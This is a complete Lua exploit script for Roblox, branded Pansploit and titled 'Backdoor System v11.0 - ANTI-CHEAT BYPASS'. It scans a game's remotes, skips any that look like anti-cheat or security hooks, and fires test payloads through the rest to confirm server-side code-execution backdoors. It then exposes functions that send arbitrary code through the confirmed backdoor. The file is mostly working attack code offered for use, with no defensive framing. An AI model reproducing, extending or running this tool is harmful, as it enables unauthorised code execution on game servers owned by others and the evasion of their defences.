--[[
    PanScript Backdoor System v11.0 - ANTI-CHEAT BYPASS
    Detects and bypasses anti-cheat/anti-backdoor remotes
]]

local _p = {}
_p._a = false
_p._m = "CLIENT"
_p._bd = nil
_p._infected = nil
_p._pid = 0
_p._gid = 0
_p._testing = false
_p._antiCheats = {} -- Store detected anti-cheats

local _alphabet = {}
for i = 65, 90 do table.insert(_alphabet, string.char(i)) end
for i = 97, 122 do table.insert(_alphabet, string.char(i)) end

if not _G._pans_data then
    _G._pans_data = {
        bd = nil,
        infected = nil,
        pid = 0,
        gid = 0,
        mode = "CLIENT",
        injected = false,
        testedRemotes = {},
        antiCheats = {}
    }
end
local _st = _G._pans_data

-- === ANTI-CHEAT DETECTION ===

local _antiCheatPatterns = {
    names = {
        "anticheat", "anti_cheat", "ac", "detection", "security", "protect",
        "ban", "kick", "log", "report", "check", "verify", "validate",
        "exploit", "hack", "backdoor", "injection", "injectioncheck",
        "sanity", "integrity", "authentic", "auth", "secure", "guard",
        "watchdog", "monitor", "shield", "defense", "defence", "safe",
        "filter", "firewall", "block", "prevent", "stop", "detect"
    },
    services = {
        "anticheat", "anti_cheat", "ac", "security", "protection", "guard",
        "defense", "defence", "shield", "watchdog", "monitoring"
    },
    attributes = {
        "anticheat", "anti_cheat", "ac", "protected", "secure", "locked",
        "readonly", "system", "core", "critical", "important"
    }
}

local function _isAntiCheat(obj)
    local info = {
        IsAntiCheat = false,
        Reason = "",
        Confidence = 0
    }
    
    -- Check name
    local name = obj.Name:lower()
    for _, pattern in ipairs(_antiCheatPatterns.names) do
        if name:find(pattern) then
            info.IsAntiCheat = true
            info.Reason = "name:" .. pattern
            info.Confidence = info.Confidence + 40
        end
    end
    
    -- Check parent service name
    if obj.Parent then
        local parentName = obj.Parent.Name:lower()
        for _, svc in ipairs(_antiCheatPatterns.services) do
            if parentName:find(svc) then
                info.IsAntiCheat = true
                info.Reason = info.Reason .. ",parent:" .. svc
                info.Confidence = info.Confidence + 50
            end
        end
    end
    
    -- Check attributes
    for _, attr in ipairs(_antiCheatPatterns.attributes) do
        local hasAttr = false
        pcall(function()
            hasAttr = obj:GetAttribute(attr) ~= nil
        end)
        if hasAttr then
            info.IsAntiCheat = true
            info.Reason = info.Reason .. ",attr:" .. attr
            info.Confidence = info.Confidence + 30
        end
    end
    
    -- Check if it's in a suspicious location
    local path = obj:GetFullName():lower()
    if path:find("anticheat") or path:find("security") or path:find("protection") then
        info.IsAntiCheat = true
        info.Reason = info.Reason .. ",path"
        info.Confidence = info.Confidence + 35
    end
    
    return info.IsAntiCheat, info
end

-- === HELPER FUNCTIONS ===

local function _disconnect(reason)
    if not _p._a then return end
    _p._a = false
    _st.injected = false
    _p._m = "CLIENT"
    _st.mode = "CLIENT"
    _p._bd = nil
    _p._infected = nil
    _st.bd = nil
    _st.infected = nil
    print("PANS_DISCONNECT:" .. reason)
    print("PANS_MODE:CLIENT")
    
    spawn(function()
        wait(0.3)
        local plr = game:GetService("Players").LocalPlayer
        if plr then
            pcall(function()
                for _, g in ipairs(game:GetService("CoreGui"):GetChildren()) do
                    if g.Name:find("PanToast") then g:Destroy() end
                end
                local sg = Instance.new("ScreenGui")
                sg.Name = "PanDC_" .. tostring(math.random(1000,9999))
                sg.ResetOnSpawn = false
                sg.Parent = game:GetService("CoreGui") or plr:WaitForChild("PlayerGui")
                local fr = Instance.new("Frame")
                fr.Size = UDim2.new(0, 320, 0, 90)
                fr.Position = UDim2.new(0.5, -160, 0.5, -45)
                fr.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
                fr.BorderSizePixel = 0
                fr.Parent = sg
                Instance.new("UICorner", fr).CornerRadius = UDim.new(0, 10)
                local tl = Instance.new("TextLabel")
                tl.Size = UDim2.new(1, -20, 0, 30)
                tl.Position = UDim2.new(0, 10, 0, 10)
                tl.BackgroundTransparency = 1
                tl.Text = "[Pansploit] DISCONNECTED"
                tl.TextColor3 = Color3.fromRGB(255, 80, 80)
                tl.Font = Enum.Font.GothamBold
                tl.TextSize = 18
                tl.Parent = fr
                local tr = Instance.new("TextLabel")
                tr.Size = UDim2.new(1, -20, 0, 40)
                tr.Position = UDim2.new(0, 10, 0, 40)
                tr.BackgroundTransparency = 1
                tr.Text = "Reason: " .. reason:gsub("_", " ")
                tr.TextColor3 = Color3.fromRGB(255, 255, 255)
                tr.Font = Enum.Font.Gotham
                tr.TextSize = 12
                tr.TextWrapped = true
                tr.Parent = fr
                wait(5)
                sg:Destroy()
            end)
        end
    end)
end

local function _toast(title, text, dur)
    dur = dur or 4
    local plr = game:GetService("Players").LocalPlayer
    if not plr then return end
    pcall(function()
        for _, g in ipairs(game:GetService("CoreGui"):GetChildren()) do
            if g.Name:find("PanToast") then g:Destroy() end
        end
    end)
    local sg = Instance.new("ScreenGui")
    sg.Name = "PanToast_" .. tostring(math.random(1000,9999))
    sg.ResetOnSpawn = false
    pcall(function() sg.Parent = game:GetService("CoreGui") end)
    if not sg.Parent then sg.Parent = plr:WaitForChild("PlayerGui") end
    local fr = Instance.new("Frame")
    fr.Size = UDim2.new(0, 350, 0, 100)
    fr.Position = UDim2.new(1, 20, 1, -120)
    fr.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    fr.BorderSizePixel = 0
    fr.Parent = sg
    Instance.new("UICorner", fr).CornerRadius = UDim.new(0, 10)
    local tl = Instance.new("TextLabel")
    tl.Size = UDim2.new(1, -20, 0, 25)
    tl.Position = UDim2.new(0, 15, 0, 8)
    tl.BackgroundTransparency = 1
    tl.Text = title
    tl.TextColor3 = _p._m == "BACKDOOR" and Color3.fromRGB(255, 80, 80) or Color3.fromRGB(0, 255, 100)
    tl.Font = Enum.Font.GothamBold
    tl.TextSize = 16
    tl.TextXAlignment = Enum.TextXAlignment.Left
    tl.Parent = fr
    local tx = Instance.new("TextLabel")
    tx.Size = UDim2.new(1, -20, 0, 60)
    tx.Position = UDim2.new(0, 15, 0, 35)
    tx.BackgroundTransparency = 1
    tx.Text = text
    tx.TextColor3 = Color3.fromRGB(255, 255, 255)
    tx.Font = Enum.Font.Gotham
    tx.TextSize = 12
    tx.TextWrapped = true
    tx.TextXAlignment = Enum.TextXAlignment.Left
    tx.Parent = fr
    spawn(function()
        for i = 1, 12 do
            fr.Position = UDim2.new(1, 20 - (i * 29), 1, -120)
            wait(0.03)
        end
        wait(dur)
        for i = 1, 12 do
            fr.Position = UDim2.new(1, -340 + (i * 29), 1, -120)
            fr.BackgroundTransparency = i / 12
            wait(0.03)
        end
        sg:Destroy()
    end)
end

local function _generateName(length)
    length = length or math.random(12, 30)
    local name = ""
    for i = 1, length do
        name = name .. _alphabet[math.random(1, #_alphabet)]
    end
    return name
end

-- SAFE fire test that skips anti-cheats
local function _fireTest(remote, code)
    -- Check if this remote is flagged as anti-cheat
    if _st.antiCheats[remote:GetFullName()] then
        return false, "Skipped anti-cheat remote"
    end
    
    local testCode = "a=Instance.new('Model',workspace)a.Name='" .. code .. "'"
    
    -- Use pcall to prevent detection
    local success = pcall(function()
        if remote:IsA("RemoteEvent") then
            remote:FireServer(testCode)
        elseif remote:IsA("RemoteFunction") then
            spawn(function()
                pcall(function()
                    remote:InvokeServer(testCode)
                end)
            end)
        end
    end)
    
    return success
end

local function _exec(code, useInfected)
    if not code then return false, "No code" end
    if useInfected and _p._infected and _p._infected.Object then
        local s, r = pcall(function()
            local fn, err = loadstring(code)
            if fn then return fn() end
            error(err)
        end)
        return s, r
    end
    local s, r = pcall(function()
        local fn, err = loadstring(code)
        if fn then return fn() end
        error(err)
    end)
    return s, r
end

-- === DETECTION FUNCTIONS ===

local function _analyzeScript(obj)
    local info = {
        Object = obj,
        Path = obj:GetFullName(),
        Name = obj.Name,
        Type = obj.ClassName,
        Score = 0,
        Reasons = {},
        InfectionType = "NONE",
        Tested = false
    }
    local src = ""
    pcall(function() src = obj.Source or "" end)
    if src == "" then return info end
    local srcLower = src:lower()
    
    if src:find("OnServerEvent") and src:find("Connect") and src:find("loadstring") then
        if src:find("function%s*%([^,]+,[^%)]+%)") then
            info.Score = info.Score + 100
            info.InfectionType = "REMOTE_LOADSTRING"
            table.insert(info.Reasons, "OnServerEvent+loadstring")
        end
    end
    if src:find("OnServerInvoke") and src:find("loadstring") then
        info.Score = info.Score + 90
        info.InfectionType = "REMOTEFUNC_LOADSTRING"
        table.insert(info.Reasons, "OnServerInvoke+loadstring")
    end
    if src:find("Instance%.new%s*%(%s*[\"']RemoteEvent[\"']") and src:find("ReplicatedStorage") then
        info.Score = info.Score + 40
        table.insert(info.Reasons, "Dynamic RemoteEvent")
    end
    if src:find("require%s*%(") and (src:find("HttpGet") or src:find("loadstring")) then
        info.Score = info.Score + 80
        info.InfectionType = "REQUIRE_INJECTION"
        table.insert(info.Reasons, "require+HTTP/loadstring")
    end
    if src:find("game:HttpGet") and src:find("loadstring") then
        info.Score = info.Score + 85
        info.InfectionType = "HTTP_LOADSTRING"
        table.insert(info.Reasons, "game:HttpGet+loadstring")
    end
    if (src:find("setfenv") or src:find("getfenv")) and src:find("loadstring") then
        info.Score = info.Score + 70
        table.insert(info.Reasons, "Environment manipulation")
    end
    if src:find("FireServer") and src:find("loadstring") then
        info.Score = info.Score + 75
        table.insert(info.Reasons, "FireServer+loadstring")
    end
    local badNames = {"backdoor", "infect", "virus", "payload", "exploit", "hack", "inject"}
    for _, bad in ipairs(badNames) do
        if srcLower:find(bad) then
            info.Score = info.Score + 30
            table.insert(info.Reasons, "Suspicious: " .. bad)
        end
    end
    local nonPrintable = 0
    for i = 1, #src do
        local b = src:byte(i)
        if b < 32 and b ~= 9 and b ~= 10 and b ~= 13 then
            nonPrintable = nonPrintable + 1
        end
    end
    if nonPrintable > 50 or #src > 15000 then
        info.Score = info.Score + 25
        table.insert(info.Reasons, "Obfuscated")
    end
    return info
end

-- MAIN DETECTION with anti-cheat bypass
local function _detectBackdoors()
    local candidates = {}
    local testedCodes = {}
    local antiCheatsFound = {}
    
    local services = {
        game:GetService("ReplicatedStorage"),
        game:GetService("ReplicatedFirst"),
        game:GetService("StarterGui"),
        game:GetService("StarterPack"),
        game:GetService("StarterPlayer"),
        game:GetService("Workspace"),
        game:GetService("Players")
    }
    
    -- First pass: identify and filter anti-cheats
    for _, svc in ipairs(services) do
        for _, obj in ipairs(svc:GetDescendants()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                local fullName = obj:GetFullName()
                
                -- Skip already tested
                if _st.testedRemotes[fullName] then continue end
                
                -- Check if it's an anti-cheat
                local isAC, acInfo = _isAntiCheat(obj)
                
                if isAC then
                    -- Store anti-cheat info
                    _st.antiCheats[fullName] = acInfo
                    table.insert(antiCheatsFound, {
                        Path = fullName,
                        Name = obj.Name,
                        Reason = acInfo.Reason,
                        Confidence = acInfo.Confidence
                    })
                    print("PANS_ANTICHEAT_DETECTED:" .. fullName .. ":" .. acInfo.Reason .. ":" .. acInfo.Confidence)
                else
                    -- Skip Roblox systems
                    if fullName:find("RobloxReplicatedStorage") then continue end
                    if obj.Name:find("DefaultChatSystem") then continue end
                    if obj:FindFirstChild("__FUNCTION") then continue end
                    
                    table.insert(candidates, obj)
                end
            end
        end
    end
    
    -- Report anti-cheats found
    if #antiCheatsFound > 0 then
        print("PANS_ANTICHEAT_COUNT:" .. #antiCheatsFound)
        _toast("[Pansploit] AC BYPASS", "Skipped " .. #antiCheatsFound .. " anti-cheat remotes", 3)
    end
    
    -- Priority sort
    local priorityRemotes = {}
    for _, remote in ipairs(candidates) do
        local parent = remote.Parent
        local isPriority = false
        
        if parent then
            for _, s in ipairs(parent:GetDescendants()) do
                if s:IsA("Script") or s:IsA("LocalScript") then
                    local analysis = _analyzeScript(s)
                    if analysis.Score >= 50 then
                        isPriority = true
                        break
                    end
                end
            end
        end
        
        local n = remote.Name:lower()
        if n:find("backdoor") or n:find("admin") or n:find("remote") then
            isPriority = true
        end
        
        if isPriority then
            table.insert(priorityRemotes, remote)
        end
    end
    
    -- Test with anti-cheat bypass
    local testResults = {}
    local workspace = game:GetService("Workspace")
    
    for _, remote in ipairs(priorityRemotes) do
        if _p._testing then break end
        
        -- Double-check not anti-cheat
        if _st.antiCheats[remote:GetFullName()] then continue end
        
        local code = _generateName(math.random(15, 25))
        testedCodes[code] = remote
        _st.testedRemotes[remote:GetFullName()] = true
        
        local success = _fireTest(remote, code)
        if not success then
            print("PANS_TEST_SKIPPED:" .. remote:GetFullName())
        end
        
        wait(0.05)
    end
    
    wait(0.5)
    
    -- Check results
    for code, remote in pairs(testedCodes) do
        if workspace:FindFirstChild(code) then
            table.insert(testResults, {
                Object = remote,
                Path = remote:GetFullName(),
                Name = remote.Name,
                Type = remote.ClassName,
                Score = 100,
                Reasons = {"LALOL_execution_test"},
                InfectionType = "CONFIRMED_BACKDOOR",
                Tested = true,
                ExecutionTime = tick()
            })
            pcall(function() workspace[code]:Destroy() end)
        end
    end
    
    -- Fallback to signature detection
    if #testResults == 0 then
        for _, svc in ipairs(services) do
            for _, obj in ipairs(svc:GetDescendants()) do
                -- Skip anti-cheat objects
                if _st.antiCheats[obj:GetFullName()] then continue end
                
                if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
                    local analysis = _analyzeScript(obj)
                    if analysis.Score >= 60 then
                        table.insert(testResults, analysis)
                    end
                end
                
                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                    local hasAttr = false
                    pcall(function()
                        if obj:GetAttribute("Backdoor") or obj:GetAttribute("Infected") then
                            hasAttr = true
                        end
                    end)
                    
                    if hasAttr then
                        table.insert(testResults, {
                            Object = obj,
                            Path = obj:GetFullName(),
                            Name = obj.Name,
                            Type = obj.ClassName,
                            Score = 95,
                            Reasons = {"marked_attribute"},
                            InfectionType = "MARKED_BACKDOOR",
                            Tested = false
                        })
                    end
                end
            end
        end
    end
    
    table.sort(testResults, function(a, b) return a.Score > b.Score end)
    return testResults, antiCheatsFound
end

-- === MONITORING ===

local function _setupBackdoorMonitor()
    local best = _p._bd or _p._infected
    if not best then return end
    spawn(function()
        while _p._a and best.Object and best.Object.Parent do
            wait(1)
        end
        if _p._a then
            print("PANS_BACKDOOR_REMOVED")
            _disconnect("BACKDOOR_REMOVED")
        end
    end)
end

local function _setupTPHandler()
    local Players = game:GetService("Players")
    local plr = Players.LocalPlayer
    if not plr then 
        print("PANS_ERROR:NoLocalPlayer")
        return 
    end
    local originalObject = _p._bd and _p._bd.Object or (_p._infected and _p._infected.Object)
    if not originalObject then
        print("PANS_ERROR:NoBackdoorObject")
        return
    end
    local originalPath = originalObject:GetFullName()
    local originalName = originalObject.Name
    print("PANS_MONITOR_START:" .. originalPath)
    plr.CharacterRemoving:Connect(function()
        print("PANS_MAINUSER:CharacterRemoving")
        _disconnect("MAINUSER_CHAR_REMOVED")
    end)
    plr.Destroying:Connect(function()
        print("PANS_MAINUSER:PlayerDestroyed")
        _disconnect("MAINUSER_DESTROYED")
    end)
    plr:GetPropertyChangedSignal("Parent"):Connect(function()
        if plr.Parent == nil then
            print("PANS_MAINUSER:ParentNil")
            _disconnect("MAINUSER_PARENT_NIL")
        end
    end)
    spawn(function()
        while _p._a do
            wait(0.5)
            local exists = pcall(function()
                return originalObject.Parent
            end)
            if not exists then
                print("PANS_BACKDOOR:ObjectDestroyed")
                _disconnect("BACKDOOR_DESTROYED")
                break
            end
            local currentPath = ""
            pcall(function()
                currentPath = originalObject:GetFullName()
            end)
            if currentPath ~= originalPath then
                print("PANS_BACKDOOR:PathChanged:" .. currentPath)
                _disconnect("BACKDOOR_MOVED")
                break
            end
            if originalObject.Name ~= originalName then
                print("PANS_BACKDOOR:Renamed:" .. originalObject.Name)
                _disconnect("BACKDOOR_RENAMED")
                break
            end
        end
    end)
    spawn(function()
        while _p._a and originalObject do
            local conn1, conn2
            pcall(function()
                conn1 = originalObject:GetPropertyChangedSignal("Parent"):Connect(function()
                    if not _p._a then return end
                    if originalObject.Parent == nil then
                        print("PANS_BACKDOOR:ParentNil")
                        _disconnect("BACKDOOR_PARENT_NIL")
                    else
                        print("PANS_BACKDOOR:ParentChanged")
                        _disconnect("BACKDOOR_REPARENTED")
                    end
                end)
            end)
            pcall(function()
                conn2 = originalObject:GetPropertyChangedSignal("Name"):Connect(function()
                    if _p._a and originalObject.Name ~= originalName then
                        print("PANS_BACKDOOR:NameChanged:" .. originalObject.Name)
                        _disconnect("BACKDOOR_RENAMED_BY_OTHER")
                    end
                end)
            end)
            while _p._a do wait(0.1) end
            pcall(function() conn1:Disconnect() end)
            pcall(function() conn2:Disconnect() end)
            break
        end
    end)
    local lastGameId = game.GameId
    spawn(function()
        while _p._a do
            wait(2)
            if game.GameId ~= lastGameId then
                print("PANS_GAME:GameIdChanged")
                _disconnect("GAME_CHANGED")
                break
            end
        end
    end)
    local lastPlaceId = game.PlaceId
    spawn(function()
        while _p._a do
            wait(2)
            if game.PlaceId ~= lastPlaceId then
                print("PANS_GAME:PlaceIdChanged")
                _disconnect("PLACE_CHANGED")
                break
            end
        end
    end)
    print("PANS_MONITOR_ACTIVE")
end

-- === PUBLIC API ===

function _p.R6()
    local plr = game:GetService("Players").LocalPlayer
    if not plr then return false end
    if _p._infected then
        return _exec([[
            local plr = game:GetService("Players").LocalPlayer
            if plr and plr.Character then
                local hum = plr.Character:FindFirstChildOfClass("Humanoid")
                if hum then hum:Destroy() wait(0.1)
                local nh = Instance.new("Humanoid")
                nh.Name = "Humanoid"
                nh.Parent = plr.Character end
            end
        ]], true)
    end
    local char = plr.Character
    if not char then return false end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return false end
    hum:Destroy()
    wait(0.1)
    local nh = Instance.new("Humanoid")
    nh.Name = "Humanoid"
    nh.Parent = char
    return true
end

function _p.Respawn()
    local plr = game:GetService("Players").LocalPlayer
    if not plr then return false end
    if _p._infected then
        return _exec([[
            local plr = game:GetService("Players").LocalPlayer
            if plr and plr.Character then plr.Character:BreakJoints() end
        ]], true)
    end
    local char = plr.Character
    if char then char:BreakJoints() end
    wait(0.5)
    return true
end

function _p.SwitchMode()
    local newMode = _p._m == "BACKDOOR" and "CLIENT" or "BACKDOOR"
    return _p.SetMode(newMode)
end

function _p.SetMode(mode)
    if mode == "BACKDOOR" and (_p._m == "CLIENT" or not _p._a) then
        print("PANS_RESCAN_START")
        _p._bd = nil
        _p._infected = nil
        _st.bd = nil
        _st.infected = nil
        _p._a = false
        local backdoors, antiCheats = _detectBackdoors()
        if #backdoors > 0 then
            local best = backdoors[1]
            _p._bd = best
            _st.bd = best
            if best.InfectionType == "CONFIRMED_BACKDOOR" then
                _p._m = "BACKDOOR"
                _st.mode = "BACKDOOR"
                _p._a = true
                _st.injected = true
                _toast("[Pansploit] BACKDOOR FOUND", 
                    "Switched to: " .. best.Name .. "\nType: " .. best.Type, 4)
                print("PANS_RESCAN_SUCCESS:CONFIRMED:" .. best.Path)
                _setupBackdoorMonitor()
                _setupTPHandler()
            else
                _p._infected = best
                _st.infected = best
                _p._m = "BACKDOOR"
                _st.mode = "BACKDOOR"
                _p._a = true
                _st.injected = true
                _toast("[Pansploit] INFECTED FOUND", 
                    "Switched to: " .. best.Name .. "\nScore: " .. best.Score, 4)
                print("PANS_RESCAN_SUCCESS:INFECTED:" .. best.Path)
                _setupBackdoorMonitor()
                _setupTPHandler()
            end
            print("PANS_MODE_SET:BACKDOOR:true")
            return "BACKDOOR"
        else
            _p._m = "CLIENT"
            _st.mode = "CLIENT"
            _p._a = false
            _st.injected = false
            _toast("[Pansploit] NO BACKDOOR", 
                "Rescan found nothing\nStaying in CLIENT mode", 3)
            print("PANS_RESCAN_FAILED:NO_BACKDOOR")
            print("PANS_MODE_SET:CLIENT:false")
            return "CLIENT"
        end
    else
        _p._m = mode
        _st.mode = mode
        if mode == "CLIENT" then
            _p._a = false
            _st.injected = false
            print("PANS_MODE_SET:CLIENT:false")
        else
            print("PANS_MODE_SET:" .. mode .. ":" .. tostring(_p._a))
        end
        return _p._m
    end
end

function _p.GetMode()
    return _p._m
end

-- Get anti-cheat info
function _p.GetAntiCheats()
    local list = {}
    for path, info in pairs(_st.antiCheats) do
        table.insert(list, {
            Path = path,
            Reason = info.Reason,
            Confidence = info.Confidence
        })
    end
    return list
end

-- Bypass specific anti-cheat (manual)
function _p.BypassAntiCheat(path)
    _st.antiCheats[path] = {
        Reason = "manual_bypass",
        Confidence = 100
    }
    print("PANS_AC_BYPASSED:" .. path)
    return true
end

function _p.Init(pid, gid)
    _p._pid = pid or 0
    _p._gid = gid or 0
    _st.pid = _p._pid
    _st.gid = _p._gid
    print("PANS_SCAN_START:" .. pid .. ":" .. gid)
    
    -- Clear previous anti-cheat cache for fresh scan
    _st.antiCheats = {}
    
    local backdoors, antiCheats = _detectBackdoors()
    
    -- Report anti-cheats to C#
    if #antiCheats > 0 then
        print("PANS_AC_BYPASS_ACTIVE:" .. #antiCheats)
        for _, ac in ipairs(antiCheats) do
            print("PANS_AC_SKIPPED:" .. ac.Path .. ":" .. ac.Reason)
        end
    end
    
    if #backdoors > 0 then
        local best = backdoors[1]
        _p._bd = best
        _st.bd = best
        if best.InfectionType == "CONFIRMED_BACKDOOR" then
            _p._m = "BACKDOOR"
            _st.mode = "BACKDOOR"
            _p._a = true
            _st.injected = true
            _toast("[Pansploit] LALOL CONFIRMED!", 
                "Backdoor: " .. best.Name .. "\nType: " .. best.Type .. "\nAC Bypass: " .. #antiCheats, 6)
            print("PANS_BACKDOOR_CONFIRMED:" .. pid .. ":" .. gid .. ":" .. best.Path .. ":" .. best.Type)
        else
            _p._infected = best
            _st.infected = best
            _p._m = "BACKDOOR"
            _st.mode = "BACKDOOR"
            _p._a = true
            _st.injected = true
            _toast("[Pansploit] INFECTED SCRIPT", 
                "Path: " .. best.Name .. "\nScore: " .. best.Score .. "\nAC Bypass: " .. #antiCheats, 5)
            print("PANS_INFECTED_FOUND:" .. pid .. ":" .. gid .. ":" .. best.Path .. ":" .. best.Type .. ":" .. best.InfectionType)
        end
        print("PANS_MODE:BACKDOOR")
        _setupBackdoorMonitor()
        _setupTPHandler()
        return true, best
    end
    
    _toast("[Pansploit]", "No backdoors found\nAC Bypassed: " .. #antiCheats, 3)
    print("PANS_NO_BACKDOOR:" .. pid .. ":" .. gid)
    print("PANS_MODE:CLIENT")
    
    return false, nil
end

function _p.Exec(code, useBackdoor)
    if not _p._a and _p._m ~= "CLIENT" then
        return false, "Not active"
    end
    local use = useBackdoor or (_p._infected ~= nil and _p._m == "BACKDOOR")
    return _exec(code, use)
end

function _p.ExecBackdoor(code)
    if not _p._bd then
        return false, "No confirmed backdoor"
    end
    
    -- Check if backdoor is flagged as anti-cheat (shouldn't happen but safety check)
    if _st.antiCheats[_p._bd.Path] then
        return false, "Backdoor flagged as anti-cheat"
    end
    
    local remote = _p._bd.Object
    if remote:IsA("RemoteEvent") then
        remote:FireServer(code)
        return true, "Fired"
    elseif remote:IsA("RemoteFunction") then
        spawn(function()
            pcall(function()
                remote:InvokeServer(code)
            end)
        end)
        return true, "Invoked"
    end
    return false, "Invalid remote type"
end

function _p.ExecInfected(code)
    if not _p._infected then
        return false, "No infected script"
    end
    return _exec(code, true)
end

function _p.Status()
    local acCount = 0
    for _ in pairs(_st.antiCheats) do acCount = acCount + 1 end
    
    return {
        Active = _p._a,
        Mode = _p._m,
        PID = _p._pid,
        GID = _p._gid,
        AntiCheatsBypassed = acCount,
        Backdoor = _p._bd and {
            Path = _p._bd.Path,
            Name = _p._bd.Name,
            Type = _p._bd.Type,
            Confirmed = _p._bd.Tested
        } or nil,
        Infected = _p._infected and {
            Path = _p._infected.Path,
            Name = _p._infected.Name,
            Type = _p._infected.Type,
            Score = _p._infected.Score
        } or nil,
        HasBackdoor = _p._bd ~= nil,
        HasInfected = _p._infected ~= nil
    }
end

_st.payload = _p
return _p
